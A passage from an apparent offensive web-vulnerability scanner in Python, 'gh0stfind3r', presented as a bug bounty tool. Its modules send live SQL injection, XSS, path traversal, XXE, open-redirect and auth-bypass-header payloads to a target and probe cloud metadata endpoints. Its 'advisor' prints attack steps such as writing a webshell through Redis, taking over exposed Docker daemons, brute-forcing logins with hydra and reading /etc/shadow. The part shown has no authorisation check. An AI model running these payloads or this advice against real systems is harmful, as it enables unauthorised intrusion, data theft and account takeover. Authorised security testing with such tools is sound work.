                vuln("CRITICAL", line.strip())
    else:
        install_hint("sqlmap", "sudo apt install sqlmap -y")

    # Manual tests
    info("Manual SQL injection probes...")
    err_sigs = ["sql syntax","mysql","ora-","odbc","jdbc","syntax error",
                "unclosed quotation","quoted string not properly terminated",
                "warning: mysql_","supplied argument is not a valid mysql",
                "pg_query()","unterminated string literal"]

    time_payloads = [
        ("' AND SLEEP(3)--", 3),
        ("1 AND SLEEP(3)--", 3),
        ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", 3),
    ]

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    if not params:
        info("No URL params to test. Add ?id=1 to URL for better SQLi testing")
        return

    for param in params:
        # Error-based
        for payload in ["'", '"', "' OR '1'='1", "' OR 1=1--", "' AND 1=2--"]:
            new_params = {**params, param: [payload]}
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_params, doseq=True)))
            code, _, body = http_get(test_url, 6)
            body_l = body.lower()
            if any(sig in body_l for sig in err_sigs):
                vuln("CRITICAL", f"Error-based SQLi in param '{param}' with: {payload[:30]}")

        # Time-based
        for payload, delay in time_payloads[:1]:
            new_params = {**params, param: [payload]}
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_params, doseq=True)))
            t0 = time.time()
            http_get(test_url, delay+5)
            elapsed = time.time() - t0
            if elapsed >= delay * 0.8:
                vuln("CRITICAL", f"Time-based SQLi in param '{param}' – {elapsed:.1f}s delay!")

# ─────────────────────────────────────────────
#  MODULE 10 – XSS TESTING
# ─────────────────────────────────────────────
def module_xss(url):
    section("XSS Testing")

    if tool_exists("dalfox"):
        info("Running dalfox...")
        out, _ = run_cmd(f"dalfox url {url} --no-spinner -q --timeout 10", timeout=180)
        for line in out.splitlines():
            if "POC" in line or "VULN" in line or "Injected" in line:
                vuln("HIGH", line.strip())
    else:
        install_hint("dalfox", "go install github.com/hahwul/dalfox/v2@latest")

    xss_payloads = [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "<img src=x onerror=alert(1)>",
        "'><svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        '"><iframe src="javascript:alert(1)">',
        "'-alert(1)-'",
        "${alert(1)}",                           # Template injection XSS
        "<ScRiPt>alert(1)</ScRiPt>",             # Case bypass
        "%3Cscript%3Ealert(1)%3C/script%3E",     # URL encoded
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",  # HTML entities
    ]

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    if params:
        info(f"Testing {len(params)} params for reflected XSS...")
        for param in params:
            for payload in xss_payloads[:6]:
                new_params = {**params, param: [payload]}
                test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_params, doseq=True)))
                code, hdrs, body = http_get(test_url, 6)
                if payload in body or urllib.parse.unquote(payload) in body:
                    vuln("HIGH", f"Reflected XSS! Param: '{param}' → {payload[:40]}")
                # DOM-based hint
                if "document.write" in body or "innerHTML" in body or "eval(" in body:
                    warn(f"DOM sink detected in response – check for DOM XSS: {param}")
    else:
        info("No URL params found. Try: gh0stfind3r -u 'https://target.com/page?q=test'")

# ─────────────────────────────────────────────
#  MODULE 11 – LFI / PATH TRAVERSAL
# ─────────────────────────────────────────────
def module_lfi(url):
    section("LFI / Path Traversal Testing")

    lfi_payloads = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "/windows/win.ini",
        "C:\\Windows\\win.ini",
        "C:\\boot.ini",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=config.php",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  # phpinfo() via data://
    ]

    lfi_sigs = ["root:x:","bin:x:","daemon:","nobody:","[boot loader]","for 16-bit",
                "<?php","root:!","www-data"]

    file_params = ["file","path","page","include","template","view","doc","document",
                   "lang","language","dir","folder","name","pg","p","f","l"]

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    # Check if any URL param looks like a file path
    targets = {p: v for p, v in params.items() if any(fp in p.lower() for fp in file_params)}
    if not targets:
        targets = params  # test all params anyway

    if targets:
        info(f"Testing {len(targets)} params for LFI...")
        for param in targets:
            for payload in lfi_payloads[:8]:
                new_params = {**params, param: [payload]}
                test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_params, doseq=True)))
                code, _, body = http_get(test_url, 6)
                if any(sig in body for sig in lfi_sigs):
                    vuln("CRITICAL", f"LFI confirmed! Param '{param}' with: {payload[:40]}")
                    if "root:x:" in body:
                        tip("You can read /etc/passwd! Try /etc/shadow, /proc/self/environ")
    else:
        info("No file-type params found. Manual test: ?page=../../../etc/passwd")

    tip("LFI to RCE: try log poisoning, PHP filter chains, proc/self/environ")

# ─────────────────────────────────────────────
#  MODULE 12 – XXE TESTING
# ─────────────────────────────────────────────
def module_xxe(url):
    section("XXE (XML External Entity) Testing")

    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><test>&xxe;</test>',
    ]

    # Find XML-accepting endpoints
    parsed = urllib.parse.urlparse(url)
    host = parsed.netloc

    info("Looking for XML-accepting endpoints...")
    xml_endpoints = []

    # Check content-type hints
    code, hdrs, body = http_get(url, 8)
    if "xml" in str(hdrs).lower() or "soap" in str(hdrs).lower():
        xml_endpoints.append(url)

    # Common XML endpoints
    for path in ["/api", "/api/v1", "/soap", "/ws", "/service", "/xml", "/xmlrpc.php"]:
        ep = url.rstrip("/") + path
        code2, hdrs2, _ = http_get(ep, 4)
        if code2 in [200, 401, 403, 405]:
            xml_endpoints.append(ep)

    if xml_endpoints:
        for ep in xml_endpoints[:3]:
            for payload in xxe_payloads[:2]:
                code3, _, body3 = http_post(ep, payload, content_type="application/xml")
                if "root:x:" in body3 or "hostname" in body3:
                    vuln("CRITICAL", f"XXE confirmed on {ep}!")
                elif code3 in [200, 500]:
                    info(f"XML endpoint found at {ep} – manual XXE testing recommended")
    else:
        info("No obvious XML endpoints found. Check API endpoints manually")

    tip("XXE to SSRF: use http:// payloads to probe internal services")
    tip("Blind XXE: use OOB (out-of-band) with Burp Collaborator or interact.sh")

# ─────────────────────────────────────────────
#  MODULE 13 – SSRF / OPEN REDIRECT
# ─────────────────────────────────────────────
def module_ssrf(url):
    section("SSRF & Open Redirect Testing")

    ssrf_payloads = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "http://169.254.169.254/latest/meta-data/",         # AWS IMDSv1
        "http://169.254.169.254/latest/meta-data/iam/",     # AWS IAM roles
        "http://metadata.google.internal/computeMetadata/v1/", # GCP
        "http://169.254.169.254/metadata/v1/",              # DigitalOcean
        "http://100.100.100.200/latest/meta-data/",         # Alibaba Cloud
        "http://192.168.1.1/",                              # Internal router
        "dict://127.0.0.1:6379/info",                       # Redis SSRF
        "gopher://127.0.0.1:6379/_PING",                    # Gopher SSRF
        "file:///etc/passwd",
    ]

    ssrf_param_hints = ["url","redirect","target","next","dest","link","callback",
                        "path","img","image","src","to","goto","return","ref","jump",
                        "continue","load","fetch","request","proxy","forward","location"]

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    ssrf_params = [p for p in params if any(h in p.lower() for h in ssrf_param_hints)]

    if ssrf_params:
        warn(f"Found potentially SSRF-vulnerable params: {yellow(str(ssrf_params))}")
        tip("These params accept URLs – test with SSRF payloads:")
        for param in ssrf_params:
            for payload in ssrf_payloads[:3]:
                base_only = url.split("?")[0]
                encoded = urllib.parse.quote(payload)
                warn(f"  Try: {cyan(f'{base_only}?{param}={encoded}')}")
    else:
        info("No obvious SSRF params. Common param names: url, redirect, src, dest, callback")

    # Open redirect test
    redirect_params = [p for p in params if any(h in p.lower() for h in
                       ["redirect","next","url","goto","return","target","dest","to"])]
    if redirect_params:
        info("Testing open redirect...")
        or_payloads = ["//google.com", "https://evil.com", "/\\evil.com",
                       "///evil.com", "//evil%2ecom", "http://evil.com@target.com"]
        for param in redirect_params:
            for payload in or_payloads[:3]:
                new_params = {**params, param: [payload]}
                test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_params, doseq=True)))
                try:
                    code, hdrs, _ = http_get(test_url, 6, follow=False)
                    if code in [301,302,303,307,308]:
                        location = hdrs.get("Location", hdrs.get("location", ""))
                        if "google.com" in location or "evil.com" in location:
                            vuln("HIGH", f"Open Redirect! Param '{param}' → {location}")
                except:
                    pass

# ─────────────────────────────────────────────
#  MODULE 14 – SSL / TLS
# ─────────────────────────────────────────────
def module_ssl(domain):
    section("SSL / TLS Analysis")

    if tool_exists("testssl.sh") or tool_exists("testssl"):
        cmd = "testssl.sh" if tool_exists("testssl.sh") else "testssl"
        info("Running testssl.sh...")
        out, _ = run_cmd(f"{cmd} --quiet --color 0 --fast {domain}", timeout=180)
        for line in out.splitlines():
            if any(k in line for k in ["CRITICAL","HIGH","MEDIUM","LOW","OK","WARN","NOT"]):
                info(f"  {line.strip()}")
    else:
        install_hint("testssl.sh")

    # Manual cert inspection
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.settimeout(10)
            s.connect((domain, 443))
            cert = s.getpeercert()
            cipher = s.cipher()

            expiry = cert.get("notAfter", "")
            issuer  = dict(x[0] for x in cert.get("issuer", []))
            subject = dict(x[0] for x in cert.get("subject", []))
            sans    = cert.get("subjectAltName", [])

            ok(f"Subject CN: {cyan(subject.get('commonName','N/A'))}")
            ok(f"Issuer: {cyan(issuer.get('organizationName','N/A'))}")
            ok(f"Expires: {yellow(expiry)}")
            ok(f"Cipher: {cyan(str(cipher))}")

            # SAN subdomains leak
            if sans:
                info(f"SAN domains ({len(sans)}): " + ", ".join(v for _, v in sans[:8]))

            # Expiry check
            try:
                exp_dt = datetime.strptime(expiry, "%b %d %H:%M:%S %Y %Z")
                days = (exp_dt - datetime.utcnow()).days
                if days < 0:
                    vuln("CRITICAL", f"SSL certificate EXPIRED {abs(days)} days ago!")
                elif days < 14:
                    vuln("HIGH", f"SSL certificate expires in {days} days!")
                elif days < 30:
                    vuln("MEDIUM", f"SSL certificate expires in {days} days")
                else:
                    ok(f"Certificate valid for {days} more days")
            except:
                pass
    except ssl.SSLError as e:
        vuln("HIGH", f"SSL error: {e}")
    except Exception as e:
        warn(f"SSL check: {e}")

# ─────────────────────────────────────────────
#  MODULE 15 – NUCLEI
# ─────────────────────────────────────────────
def module_nuclei(url):
    section("Nuclei Vulnerability Scanning")

    if not tool_exists("nuclei"):
        install_hint("nuclei", "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
        return

    run_cmd("nuclei -update-templates -silent", timeout=60, silent=True)

    info("Running nuclei (critical + high + medium)...")
    out, _ = run_cmd(
        f"nuclei -u {url} -severity critical,high,medium -silent -no-color "
        f"-timeout 10 -rate-limit 50 -bulk-size 20",
        timeout=360
    )
    count = 0
    for line in out.splitlines():
        if line.strip():
            if "[critical]" in line.lower():
                vuln("CRITICAL", line.strip())
            elif "[high]" in line.lower():
                vuln("HIGH", line.strip())
            elif "[medium]" in line.lower():
                vuln("MEDIUM", line.strip())
            else:
                ok(line.strip())
            count += 1

    ok(f"Nuclei scan done — {count} findings")

# ─────────────────────────────────────────────
#  MODULE 16 – NIKTO
# ─────────────────────────────────────────────
def module_nikto(url):
    section("Nikto Web Server Scan")

    if not tool_exists("nikto"):
        install_hint("nikto")
        return

    info("Running nikto (may take a while)...")
    out, _ = run_cmd(f"nikto -h {url} -Tuning 1234578 -nointeractive -maxtime 180", timeout=200)
    for line in out.splitlines():
        if line.startswith("+") and "osvdb" not in line.lower():
            if any(k in line.lower() for k in ["vuln","dangerous","allow","missing","disclose","inject"]):
                vuln("MEDIUM", line.lstrip("+ ").strip())
            else:
                info(line.lstrip("+ ").strip())

# ─────────────────────────────────────────────
#  MODULE 17 – IDOR / API LOGIC
# ─────────────────────────────────────────────
def module_idor_api(url):
    section("IDOR & API Logic Bug Testing")

    tip("IDOR Playbook:")
    tip("  1. Log in as User A → copy request with ID (e.g. /api/user/42)")
    tip("  2. Log in as User B → replay with User A's ID")
    tip("  3. If you see User A's data → IDOR confirmed")
    tip("  4. Also test: BOLA (object-level), BFLA (function-level)")

    api_paths = [
        "/api", "/api/v1", "/api/v2", "/api/v3", "/rest",
        "/graphql", "/gql", "/swagger", "/swagger-ui.html",
        "/api-docs", "/openapi.json", "/swagger.json",
        "/api/users", "/api/user/1", "/api/user/2",
        "/api/admin", "/api/me", "/api/profile", "/api/account",
        "/api/orders", "/api/payments", "/api/transactions",
        "/api/config", "/api/settings", "/api/keys",
        "/api/internal", "/api/debug", "/api/health",
        "/v1/users", "/v1/admin", "/v2/users",
    ]

    info("Probing API endpoints...")
    json_endpoints = []
    for path in api_paths:
        full_url = url.rstrip("/") + path
        code, hdrs, body = http_get(full_url, 5, {"Accept": "application/json"})
        ct = (hdrs.get("Content-Type") or hdrs.get("content-type") or "").lower()
        if code == 200:
            if "json" in ct or body.strip().startswith("{") or body.strip().startswith("["):
                vuln("HIGH", f"API endpoint returns JSON [{code}]: {cyan(full_url)} ({len(body)}B)")
                json_endpoints.append(full_url)
            else:
                ok(f"Accessible [{code}]: {cyan(full_url)}")
        elif code == 401:
            warn(f"Auth required [401]: {full_url} ← endpoint exists")
        elif code == 403:
            warn(f"Forbidden [403]: {full_url} ← endpoint exists, try auth bypass")

    # GraphQL introspection
    gql_urls = [url.rstrip("/") + p for p in ["/graphql", "/gql", "/api/graphql"]]
    for gurl in gql_urls:
        payload = json.dumps({"query": "{__schema{types{name kind}}}"})
        code, _, body = http_post(gurl, payload, content_type="application/json")
        if "__schema" in body or (code == 200 and "types" in body):
            vuln("HIGH", f"GraphQL introspection enabled: {cyan(gurl)}")
            tip("Introspection leak: map entire API with InQL or GraphQL Voyager")

    # Mass assignment test hint
    tip("Mass Assignment: try adding extra fields in POST/PUT requests (admin:true, role:admin)")
    tip("IDOR numeric IDs: fuzz /api/user/1 through /api/user/100 with ffuf")

# ─────────────────────────────────────────────
#  MODULE 18 – CSRF
# ─────────────────────────────────────────────
def module_csrf(url):
    section("CSRF Detection")

    code, hdrs, html = http_get(url, 10)
    if not html:
        return

    forms = re.findall(r'<form[^>]*>(.*?)</form>', html, re.IGNORECASE | re.DOTALL)
    csrf_patterns = re.findall(r'csrf|_token|authenticity_token|nonce|__RequestVerificationToken',
                               html, re.IGNORECASE)

    if forms:
        info(f"Found {len(forms)} HTML form(s)")
        if not csrf_patterns:
            vuln("HIGH", "No CSRF token found in forms — likely vulnerable to CSRF")
            tip("CSRF PoC: create a page with hidden form auto-submitting to target")
        else:
            ok(f"CSRF token found: {csrf_patterns[0]}")
    else:
        info("No HTML forms on main page – check other endpoints")

    # SameSite check
    cookie = hdrs.get("Set-Cookie", hdrs.get("set-cookie", ""))
    if cookie and "samesite" not in cookie.lower():
        vuln("MEDIUM", "Session cookie missing SameSite attribute — CSRF possible")

# ─────────────────────────────────────────────
#  MODULE 19 – RATE LIMIT & AUTH BYPASS
# ─────────────────────────────────────────────
def module_ratelimit_auth(url):
    section("Rate Limit & Auth Bypass Testing")

    # Find login-like endpoints
    login_endpoints = []
    for path in ["/login", "/api/login", "/api/auth", "/auth/login", "/signin",
                 "/api/signin", "/user/login", "/account/login", "/wp-login.php"]:
        full = url.rstrip("/") + path
        code, _, _ = http_get(full, 5)
        if code in [200, 405]:
            login_endpoints.append(full)
            info(f"Login endpoint found: {cyan(full)}")

    if login_endpoints:
        ep = login_endpoints[0]
        info(f"Rate limit test on {ep}...")
        success = 0
        blocked = False
        for i in range(10):
            data = urllib.parse.urlencode({"username":"admin","password":f"wrongpass{i}"})
            code, hdrs, body = http_post(ep, data)
            if code == 429:
                blocked = True
                ok(f"Rate limiting active — blocked after {i+1} attempts (429)")
                break
            elif code in [200, 401, 403]:
                success += 1
        if not blocked:
            vuln("HIGH", f"No rate limiting detected on {ep} — {success}/10 requests succeeded!")
            tip("Brute-force login: hydra -l admin -P rockyou.txt <target> http-post-form")

    # Auth header bypass attempts
    info("Testing common auth bypass headers...")
    bypass_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
    ]
    admin_url = url.rstrip("/") + "/admin"
    base_code, _, _ = http_get(admin_url, 5)
    if base_code in [401, 403]:
        for h in bypass_headers:
            code2, _, body2 = http_get(admin_url, 5, h)
            if code2 == 200:
                hname = list(h.keys())[0]
                vuln("CRITICAL", f"Auth bypass via header {hname}! Got 200 on /admin")

    # HTTP method bypass
    info("Testing HTTP method bypass on 403 pages...")
    for path in ["/admin", "/dashboard", "/api/admin"]:
        full = url.rstrip("/") + path
        c403, _, _ = http_get(full, 4)
        if c403 == 403:
            for method in ["POST", "PUT", "OPTIONS", "PATCH", "HEAD", "TRACE"]:
                try:
                    req = urllib.request.Request(full, method=method,
                                                headers={"User-Agent": UA})
                    with urllib.request.urlopen(req, timeout=4) as r:
                        if r.getcode() == 200:
                            vuln("HIGH", f"403 bypass via {method} method on {full}")
                except:
                    pass

# ─────────────────────────────────────────────
#  MODULE 20 – BUSINESS LOGIC BUGS
# ─────────────────────────────────────────────
def module_business_logic(url, domain):
    section("Business Logic Bug Detection")

    tip("Business Logic Testing Areas:")
    logic_checks = [
        ("Negative Price",      "Try price=-1 or amount=-999 in payment params"),
        ("Quantity Zero",       "Submit quantity=0 and see if item is free"),
        ("Coupon Stacking",     "Apply same coupon code multiple times in one order"),
        ("Race Condition",      "Send parallel POST requests to /purchase endpoint"),
        ("Price Manipulation",  "Intercept checkout, modify price field before submit"),
        ("Referral Abuse",      "Refer yourself using alt email for bonus"),
        ("Password Reset Flaw", "Check if token is reusable or doesn't expire"),
        ("Email Takeover",      "Change email, intercept verification link before confirm"),
        ("Skip 2FA",            "After 1st auth step, directly access post-auth page"),
        ("Order State Bypass",  "Cancel order, then try to ship; or pay after fulfillment"),
        ("Integer Overflow",    "Submit very large quantity (99999999) – check total price"),
        ("Mass Assignment",     "POST {role:'admin'} or {is_admin:true} in registration"),
    ]
    for name, desc in logic_checks:
        tip(f"  [{cyan(name)}] {desc}")

    # Check for price/amount params
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    money_params = [p for p in params if any(k in p.lower() for k in
                    ["price","amount","total","cost","qty","quantity","count","fee"])]
    if money_params:
        warn(f"Money-related params found: {money_params} — test for business logic bugs!")
        for mp in money_params:
            for val in ["0", "-1", "0.001", "99999999"]:
                new_p = {**params, mp: [val]}
                test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_p, doseq=True)))
                code, _, body = http_get(test_url, 5)
                if code == 200:
                    info(f"  param '{mp}'={val} → HTTP {code} (check response manually)")

# ─────────────────────────────────────────────
#  MODULE 21 – AI HEURISTIC ADVISOR
# ─────────────────────────────────────────────
def module_ai_advisor(domain, open_ports, header_issues, subdomains):
    section("🤖 AI Heuristic Bug Bounty Advisor")

    priority = []
    attack_paths = []

    # Port-based analysis
    dangerous_ports = {
        21:    ("CRITICAL","FTP","Try anonymous:anonymous login; banner grab; CVE lookup"),
        23:    ("CRITICAL","Telnet","Capture credentials; protocol is cleartext"),
        3306:  ("CRITICAL","MySQL","Try: mysql -h target -u root; test default creds"),
        6379:  ("CRITICAL","Redis","redis-cli -h target; CONFIG SET → write webshell"),
        9200:  ("CRITICAL","Elasticsearch","curl http://target:9200/_cat/indices?v"),
        27017: ("CRITICAL","MongoDB","mongo target:27017 – check if auth required"),
        2375:  ("CRITICAL","Docker","docker -H tcp://target:2375 ps – full compromise"),
        7001:  ("CRITICAL","WebLogic","Check for CVE-2023-21839, CVE-2019-2725 RCE"),
        8161:  ("CRITICAL","ActiveMQ","Check CVE-2023-46604 – unauthenticated RCE"),
        445:   ("HIGH","SMB","Check EternalBlue (MS17-010); null session enum"),
        5432:  ("HIGH","PostgreSQL","Try default creds; check pg_hba.conf exposure"),
        5900:  ("HIGH","VNC","Try bruteforce; check for no-auth mode"),
        8080:  ("MEDIUM","HTTP-Alt","Check for Tomcat manager, Jenkins, etc."),
        8443:  ("MEDIUM","HTTPS-Alt","Look for admin panels, dev endpoints"),
    }
    for port in open_ports:
        if port in dangerous_ports:
            sev, svc, attack = dangerous_ports[port]
            priority.append((sev, f"Port {port}/{svc}: {attack}"))

    # Subdomain analysis
    interesting_subs = ["dev","staging","test","beta","uat","admin","api","internal",
                        "corp","old","backup","legacy","demo","stage","preprod","qa"]
    for sub in subdomains:
        for hint in interesting_subs:
            if hint in sub.lower():
                priority.append(("HIGH", f"Interesting subdomain: {sub} – check for reduced security"))
                attack_paths.append(f"Attack via {sub}: less hardened, may lack WAF")
                break

    # Attack path suggestions
    attack_paths += [
        f"Recon chain: crt.sh → {domain} subdomains → find unprotected dev/staging",
        "API attack: enumerate endpoints → test IDOR with sequential IDs",
        "JS recon: search all .js files for hardcoded secrets/tokens",
        "Auth bypass: test 403 paths with X-Original-URL / method override",
        "Race condition: concurrent POST to /checkout → negative balance?",
        "Password reset: test predictable tokens, no expiry, host injection",
        "File upload: try .php.jpg, .phtml, Content-Type spoofing",
        "SSTI test: inject {{7*7}} or ${7*7} in all user-input fields",
    ]

    general_tips = [
        f"🌐 Target {domain} – map full attack surface before exploiting",
        "🔑 JWT attacks: change alg to 'none', test weak secrets with jwt_tool",
        "📁 Directory traversal: fuzz file params with ../../../../etc/passwd",
        "🧵 Race condition: use Turbo Intruder or Burp's parallel requests",
        "💰 Hunt for high-impact: IDOR > SQLi > RCE > Auth bypass > XSS",
        "📊 Check exposed metrics: /metrics, /actuator – may leak internals",
        "🔗 Chain vulns: open redirect + XSS → account takeover",
        "📧 Host header injection: in password reset email → account takeover",
        "🗃️ GraphQL: introspection + batch query abuse + field traversal",
        "🔒 2FA bypass: reuse OTP, try response manipulation, check backup codes",
    ]

    print(f"\n{mag('═'*55)}")
    print(f"{mag('  PRIORITY ATTACK TARGETS')}")
    print(f"{mag('═'*55)}")
    order = ["CRITICAL","HIGH","MEDIUM","LOW"]
    colors_map = {"CRITICAL": C.RED+C.BOLD, "HIGH": C.RED, "MEDIUM": C.YELLOW, "LOW": C.CYAN}
    for sev in order:
        items = [(s, m) for s, m in priority if s == sev]
        for s, m in items:
            c = colors_map.get(s, C.WHITE)
            print(f"  {c}[{s}]{C.RESET} {m}")

    print(f"\n{mag('  ATTACK PATHS')}")
    for ap in attack_paths[:8]:
        print(f"  {cyan('→')} {ap}")

    print(f"\n{mag('  PRO TIPS')}")
    for t in general_tips:
        print(f"  {t}")

# ─────────────────────────────────────────────
#  MODULE 22 – FINAL SUMMARY DASHBOARD
# ─────────────────────────────────────────────
def print_summary(domain, ip, output_dir):
    section("📊 SCAN SUMMARY DASHBOARD")
    duration = (datetime.now() - SCAN_START).seconds

    total = sum(len(v) for v in FINDINGS.values())
    crit  = len(FINDINGS["CRITICAL"])
    high  = len(FINDINGS["HIGH"])
    med   = len(FINDINGS["MEDIUM"])
    low   = len(FINDINGS["LOW"])
    inf   = len(FINDINGS["INFO"])

    print(f"""
  {bold('Target')}   : {cyan(domain)} ({ip})
  {bold('Duration')} : {duration}s
  {bold('Log file')} : {dim(LOG_FILE)}
  {bold('Output')}   : {dim(output_dir)}

  {C.RED+C.BOLD}{'╔══════════════════════════════════════╗'}{C.RESET}
  {C.RED+C.BOLD}{'║'}{C.RESET}  Findings Summary                    {C.RED+C.BOLD}{'║'}{C.RESET}
  {C.RED+C.BOLD}{'╠══════════════════════════════════════╣'}{C.RESET}
  {C.RED+C.BOLD}{'║'}{C.RESET}  💀 CRITICAL : {C.RED+C.BOLD}{crit:<3}{C.RESET}                   {C.RED+C.BOLD}{'║'}{C.RESET}
  {C.RED+C.BOLD}{'║'}{C.RESET}  🔥 HIGH     : {C.RED}{high:<3}{C.RESET}                   {C.RED+C.BOLD}{'║'}{C.RESET}
  {C.RED+C.BOLD}{'║'}{C.RESET}  ⚡ MEDIUM   : {C.YELLOW}{med:<3}{C.RESET}                   {C.RED+C.BOLD}{'║'}{C.RESET}
  {C.RED+C.BOLD}{'║'}{C.RESET}  🔵 LOW      : {C.CYAN}{low:<3}{C.RESET}                   {C.RED+C.BOLD}{'║'}{C.RESET}
  {C.RED+C.BOLD}{'║'}{C.RESET}  ℹ️  INFO     : {C.DIM}{inf:<3}{C.RESET}                   {C.RED+C.BOLD}{'║'}{C.RESET}
  {C.RED+C.BOLD}{'║'}{C.RESET}  ─────────────────────────────       {C.RED+C.BOLD}{'║'}{C.RESET}
  {C.RED+C.BOLD}{'║'}{C.RESET}  📋 TOTAL    : {C.WHITE+C.BOLD}{total:<3}{C.RESET}                   {C.RED+C.BOLD}{'║'}{C.RESET}
  {C.RED+C.BOLD}{'╚══════════════════════════════════════╝'}{C.RESET}
""")

    if crit > 0 or high > 0:
        print(f"  {red('Top Findings:')}")
        for sev in ["CRITICAL", "HIGH"]:
            for f in FINDINGS[sev][:5]:
                c = C.RED+C.BOLD if sev=="CRITICAL" else C.RED
                print(f"  {c}[{sev}]{C.RESET} {f['title'][:80]}")

    print(f"\n  {mag('Happy Hunting! — GHOST BEROK 👻')}")
    print(f"  {dim('Use Burp Suite to manually verify and exploit findings.')}\n")

# ─────────────────────────────────────────────
#  REPORT GENERATOR
# ─────────────────────────────────────────────
def generate_report(target_url, domain, ip, output_dir):
    section("Generating Report")
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    rf = os.path.join(output_dir, f"gh0stfind3r_{domain}_{ts}_report.txt")

    with open(rf, "w") as f:
        f.write("=" * 70 + "\n")
        f.write("   gh0stfind3r v3.0 — Bug Bounty Report\n")
        f.write(f"   Author    : GHOST BEROK\n")
        f.write(f"   Date      : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"   Target    : {target_url}\n")
        f.write(f"   Domain    : {domain}\n")
        f.write(f"   IP        : {ip}\n")
        f.write(f"   Duration  : {(datetime.now() - SCAN_START).seconds}s\n")
        f.write("=" * 70 + "\n\n")

        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            if FINDINGS[sev]:
                f.write(f"\n[{sev}] FINDINGS ({len(FINDINGS[sev])})\n")
                f.write("-" * 50 + "\n")
                for finding in FINDINGS[sev]:
                    f.write(f"  [{finding['time']}] {finding['title']}\n")
                    if finding.get("detail"):
                        f.write(f"    Detail: {finding['detail']}\n")

        f.write(f"\n\nFull log: {LOG_FILE}\n")

    ok(f"Report: {green(rf)}")
    return rf

# ─────────────────────────────────────────────
#  TOOL CHECKER
# ─────────────────────────────────────────────
def check_tools():
    section("Tool Availability Check")
    tools = {
        "nmap":         ("APT", "sudo apt install nmap -y"),
        "whatweb":      ("APT", "sudo apt install whatweb -y"),
        "nikto":        ("APT", "sudo apt install nikto -y"),
        "sqlmap":       ("APT", "sudo apt install sqlmap -y"),
        "wafw00f":      ("PIP", "pip3 install wafw00f"),
        "whois":        ("APT", "sudo apt install whois -y"),
        "gobuster":     ("APT", "sudo apt install gobuster -y"),
        "dirb":         ("APT", "sudo apt install dirb -y"),
        "amass":        ("APT", "sudo apt install amass -y"),
        "testssl.sh":   ("APT", "sudo apt install testssl.sh -y"),
        "ffuf":         ("GO",  "go install github.com/ffuf/ffuf/v2@latest"),
        "subfinder":    ("GO",  "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"),
        "nuclei":       ("GO",  "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"),
        "dalfox":       ("GO",  "go install github.com/hahwul/dalfox/v2@latest"),
        "gau":          ("GO",  "go install github.com/lc/gau/v2/cmd/gau@latest"),
        "waybackurls":  ("GO",  "go install github.com/tomnomnom/waybackurls@latest"),
        "assetfinder":  ("GO",  "go install github.com/tomnomnom/assetfinder@latest"),
        "arjun":        ("PIP", "pip3 install arjun"),
        "httpx":        ("GO",  "go install github.com/projectdiscovery/httpx/cmd/httpx@latest"),
        "hydra":        ("APT", "sudo apt install hydra -y"),
        "dnsmap":       ("APT", "sudo apt install dnsmap -y"),
    }
    installed = 0
    missing_apt = []
    missing_go  = []
    missing_pip = []

    for tool, (pkg_type, install_cmd) in sorted(tools.items()):
        if tool_exists(tool):
            ok(f"  {green('✔')} {tool:<20} {dim(pkg_type)}")
            installed += 1
        else:
            sym = {"APT":"📦","GO":"🐹","PIP":"🐍"}.get(pkg_type,"•")
            err(f"  {red('✘')} {tool:<20} {dim(pkg_type)} → {dim(install_cmd)}")
            if pkg_type == "APT":   missing_apt.append(tool)
            elif pkg_type == "GO":  missing_go.append(tool)
            elif pkg_type == "PIP": missing_pip.append(tool)

    print(f"\n  {bold('Installed:')} {installed}/{len(tools)}")
    if missing_apt:
